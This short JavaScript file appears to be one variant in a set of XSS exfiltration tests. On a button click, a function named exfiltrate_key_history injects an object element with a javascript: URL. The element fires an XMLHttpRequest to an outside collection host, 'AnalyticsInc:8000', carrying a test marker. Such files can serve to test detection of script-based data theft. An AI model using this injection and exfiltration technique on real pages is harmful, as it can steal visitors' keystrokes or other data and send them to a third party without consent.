function exfiltrate_key_history() {

    // XSS - Object Data + JavaScript Directive - Variation 1 - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL='Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss1",true);xmlhttp.send(null);\')()';
    var script = document.createElement("object");
    script.data = 'javascript:' + URL;
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
